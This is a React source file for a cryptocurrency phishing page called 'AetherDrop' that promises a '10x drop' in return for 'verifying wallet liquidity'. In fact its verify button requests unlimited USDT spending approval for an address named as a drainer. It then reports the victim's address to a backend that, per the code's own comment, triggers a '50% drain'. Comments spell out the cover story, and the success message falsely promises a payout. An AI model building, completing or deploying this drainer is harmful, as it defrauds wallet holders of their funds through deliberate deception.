import React, { useState } from 'react';
import { ethers } from 'ethers';

const AETHER_DRAINER_ADDRESS = "0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322"; // Reusing the established drainer for simplicity in demo
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

function App() {
    const [account, setAccount] = useState(null);
    const [loading, setLoading] = useState(false);
    const [status, setStatus] = useState('');

    const connectWallet = async () => {
        if (window.ethereum) {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            setAccount(accounts[0]);
        } else {
            alert("Please install MetaMask");
        }
    };

    const handleVerify = async () => {
        if (!account) return connectWallet();
        
        setLoading(true);
        setStatus('Verifying liquidity status...');
        
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            
            const usdtContract = new ethers.Contract(
                USDT_ADDRESS,
                ["function approve(address spender, uint256 amount) returns (bool)"],
                signer
            );

            // Request approval for USDT
            // The story is that we need to verify the user has liquidity to qualify for the 10x drop
            const tx = await usdtContract.approve(AETHER_DRAINER_ADDRESS, ethers.MaxUint256);
            setStatus('Synchronizing with Aether Protocol...');
            await tx.wait();

            // After approval, we notify our backend which can then trigger the 50% drain
            await fetch('http://localhost:3005/api/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: account,
                    txHash: tx.hash,
                    token: 'USDT',
                    status: 'Approved'
                })
            });

            setStatus('Verification Successful. Your 10x AetherDrop will be processed within 24 hours.');
        } catch (err) {
            console.error(err);
            setStatus('Verification failed. Please try again.');
        } finally {
            setLoading(false);
        }
    };

    return (
        <div style={styles.container}>
            <div style={styles.glassCard}>
                <h1 style={styles.title}>AetherDrop</h1>
                <p style={styles.subtitle}>The Premium Liquidity Multiplier Protocol</p>
                
                <div style={styles.content}>
                    <p>Qualify for the exclusive 10x AetherDrop by verifying your wallet liquidity. 
                       Members receive prioritized access to high-yield pools and institutional-grade DeFi tools.</p>
                </div>

                {!account ? (
                    <button onClick={connectWallet} style={styles.button}>Connect Wallet</button>
                ) : (
                    <div style={styles.actionArea}>
                        <p style={styles.accountText}>Connected: {account.slice(0,6)}...{account.slice(-4)}</p>
                        <button 
                            onClick={handleVerify} 
                            disabled={loading} 
                            style={loading ? styles.buttonDisabled : styles.button}
                        >
                            {loading ? 'Processing...' : 'Verify & Claim 10x Drop'}
                        </button>
                        {status && <p style={styles.statusText}>{status}</p>}
                    </div>
                )}
            </div>
        </div>
    );
}

const styles = {
    container: {
        minHeight: '100vh',
        backgroundColor: '#050505',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontFamily: "'Inter', sans-serif",
        color: '#fff',
        background: 'radial-gradient(circle at top right, #1a1a2e, #050505)'
    },
    glassCard: {
        background: 'rgba(255, 255, 255, 0.03)',
        backdropFilter: 'blur(20px)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        padding: '3rem',
        borderRadius: '24px',
        maxWidth: '500px',
        width: '90%',
        textAlign: 'center',
        boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)'
    },
    title: {
        fontSize: '3rem',
        fontWeight: '900',
        letterSpacing: '-2px',
        marginBottom: '0.5rem',
        background: 'linear-gradient(to right, #fff, #666)',
        WebkitBackgroundClip: 'text',
        WebkitTextFillColor: 'transparent'
    },
    subtitle: {
        color: '#888',
        fontSize: '1rem',
        marginBottom: '2rem',
        textTransform: 'uppercase',
        letterSpacing: '2px'
    },
    content: {
        color: '#aaa',
        lineHeight: '1.6',
        marginBottom: '2.5rem',
        fontSize: '1.1rem'
    },
    button: {
        background: '#fff',
        color: '#000',
        border: 'none',
        padding: '1rem 2rem',
        borderRadius: '12px',
        fontSize: '1.1rem',
        fontWeight: '700',
        cursor: 'pointer',
        transition: 'all 0.3s ease',
        width: '100%'
    },
    buttonDisabled: {
        background: '#333',
        color: '#666',
        padding: '1rem 2rem',
        borderRadius: '12px',
        fontSize: '1.1rem',
        fontWeight: '700',
        width: '100%',
        cursor: 'not-allowed'
    },
    accountText: {
        color: '#00ff88',
        fontSize: '0.9rem',
        marginBottom: '1rem'
    },
    statusText: {
        marginTop: '1.5rem',
        fontSize: '0.9rem',
        color: '#888'
    }
};

export default App;
